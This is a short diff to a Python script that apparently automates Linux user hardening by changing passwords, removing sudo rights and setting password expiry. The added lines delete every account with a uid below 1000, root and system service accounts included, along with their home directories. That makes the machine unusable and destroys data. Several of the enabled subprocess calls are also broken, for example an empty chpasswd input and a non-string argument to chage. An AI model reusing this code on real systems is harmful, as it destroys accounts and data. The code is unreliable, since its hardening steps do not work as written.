@@ -54,6 +54,8 @@ import requests
 from bs4 import BeautifulSoup
 import sys
 from dataclasses import dataclass, field
+import pwd
+
 
 try:
     from bs4 import BeautifulSoup
@@ -195,9 +197,14 @@ def authorized_admins_users(context):
     for user in accounts.users:
         inputpchange = user + ":" + accounts.you_password
         print(inputpchange)
-        # subprocess.run(["chpasswd", input := "".encode()])
-        # subprocess.run(["gpasswd", "-d", user, "sudo"])
-        # subprocess.run(["chage", "-M", 90, user])
+        subprocess.run(["chpasswd", input := "".encode()])
+        subprocess.run(["gpasswd", "-d", user, "sudo"])
+        subprocess.run(["chage", "-M", 90, user])
+
+    for user in pwd.getpwall():
+        if user.pw_uid < 1000:
+            print(f"{user.pw_name} (uid={user.pw_uid})")
+            subprocess.run(["deluser", "--remove-home", user.pw_name])
 
     print("adding sudo")
 
